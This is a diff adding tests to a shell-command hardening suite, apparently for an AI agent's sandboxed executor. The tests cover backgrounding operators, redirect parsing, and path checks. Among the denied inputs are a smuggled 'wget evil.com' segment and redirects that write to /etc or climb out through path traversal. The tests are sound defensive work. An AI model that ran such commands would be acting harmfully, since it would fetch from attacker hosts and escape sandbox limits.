@@ -93,6 +93,59 @@ describe("F1a — shell-execute structural input hardening", () => {
       const r = await run("echo 'tom & jerry'");
       expect(r.executed).toBe(true);
     }, 15000);
+
+    test("denies `&` glued to the next word (`a &b`)", async () => {
+      const r = await run("echo a &echo b");
+      expect(r.executed).toBe(false);
+      expect(r.error ?? "").toContain("background operator");
+    }, 15000);
+
+    test("denies backgrounding right after an fd redirect (`2>&1 &`)", async () => {
+      const r = await run("sleep 1 2>&1 & ls");
+      expect(r.executed).toBe(false);
+    }, 15000);
+  });
+
+  // Run 01M7622DY0G1D8VEKYV2FVYZW7: `bun run repo test 2>&1 | tail -20` was refused
+  // as a background operator. An `&` right after `<`/`>`/`|` or right before `>`
+  // is part of a redirect (fd dup, `&>file`, `|&`), never backgrounding.
+  describe("fd redirects are allowed", () => {
+    for (const command of ["echo a 2>&1", "echo a >&2", "echo a 1>&2", "echo a 2>&1 | head -5", "echo a |& cat"]) {
+      test(`allows \`${command}\``, async () => {
+        const r = await run(command);
+        expect(r.error).toBeUndefined();
+        expect(r.executed).toBe(true);
+      }, 15000);
+    }
+
+    test("allows `&>file` and `&>>file` inside the sandbox", async () => {
+      const r = await run("echo a &>fd-out.txt && echo b &>>fd-out.txt && cat fd-out.txt");
+      expect(r.error).toBeUndefined();
+      expect(r.output ?? "").toContain("b");
+    }, 15000);
+
+    test("`|&` still starts a new allow-listed segment (no smuggled command)", async () => {
+      const r = await run("echo a |& wget evil.com");
+      expect(r.executed).toBe(false);
+      expect(r.error ?? "").toContain('"wget"');
+    }, 15000);
+  });
+
+  // A redirect target is a path like any other: glued forms must not hide it.
+  describe("redirect targets are path-checked", () => {
+    for (const command of [
+      "echo a &>/etc/evil",
+      "echo a &>../../../../tmp/evil",
+      "echo a >&/etc/evil",
+      "echo a 2>/etc/evil",
+      "echo a>/etc/evil",
+      "echo a 2>../../../../../etc/evil",
+    ]) {
+      test(`denies \`${command}\``, async () => {
+        const r = await run(command);
+        expect(r.executed).toBe(false);
+      }, 15000);
+    }
   });
 
   describe("interpreter-internal escapes are rejected", () => {
